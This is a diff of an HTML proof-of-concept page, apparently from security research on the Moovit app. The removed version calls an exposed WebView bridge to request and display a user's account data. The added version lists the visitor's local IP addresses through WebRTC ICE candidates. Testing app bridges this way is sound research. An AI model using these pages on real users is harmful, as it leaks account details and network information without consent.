@@ -1,45 +1,43 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Moovit Interface Discovery</title>
-    <style>
-        body { font-family: sans-serif; padding: 20px; background: #f0f0f0; }
-        .status { padding: 10px; border-radius: 5px; margin-bottom: 10px; }
-        .found { background: #d4edda; color: #155724; }
-        .missing { background: #f8d7da; color: #721c24; }
-    </style>
+    <title>Interface Enumerator</title>
 </head>
 <body>
-    <h1>Moovit JS Interface Test</h1>
-    <div id="mobile-status" class="status">Checking 'mobile' interface...</div>
-    <div id="moovit-status" class="status">Checking 'moovit' interface...</div>
+    <h3>Detected Local IP Interfaces:</h3>
+    <ul id="list"></ul>
 
     <script>
-        // 1. Verify 'mobile' interface (Available in WebViewActivity)
-        if (window.mobile) {
-            document.getElementById('mobile-status').className = "status found";
-            document.getElementById('mobile-status').innerText = "FOUND: 'mobile' interface";
-        } else {
-            document.getElementById('mobile-status').className = "status missing";
-            document.getElementById('mobile-status').innerText = "MISSING: 'mobile' interface";
-        }
+        async function getLocalIPs() {
+            const ips = new Set();
+            const pc = new RTCPeerConnection({
+                iceServers: []
+            });
 
-        // 2. Verify 'moovit' interface (Available in Ticketing/Payments)
-        if (window.moovit) {
-            document.getElementById('moovit-status').className = "status found";
-            document.getElementById('moovit-status').innerText = "FOUND: 'moovit' interface";
-            
-            // Define callback for the sensitive data
-            window.moovit.onAccountInfo = function(jsonString) {
-                alert("SENSITIVE DATA RETRIEVED:\n" + jsonString);
+            pc.createDataChannel("");
+            pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+            pc.onicecandidate = (ice) => {
+                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+                
+                // Regex to extract IP addresses from ICE candidate strings
+                const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3}|([a-f0-9]{1,4}(:[a-f0-9]{1,4}){7}))/g;
+                const matches = ice.candidate.candidate.match(ipRegex);
+                
+                if (matches) {
+                    matches.forEach(ip => {
+                        if (!ips.has(ip)) {
+                            ips.add(ip);
+                            const li = document.createElement("li");
+                            li.textContent = ip;
+                            document.getElementById("list").appendChild(li);
+                        }
+                    });
+                }
             };
-
-            // Trigger data request
-            window.moovit.requestAccountInfo();
-        } else {
-            document.getElementById('moovit-status').className = "status missing";
-            document.getElementById('moovit-status').innerText = "MISSING: 'moovit' interface";
         }
+
+        getLocalIPs();
     </script>
 </body>
 </html>
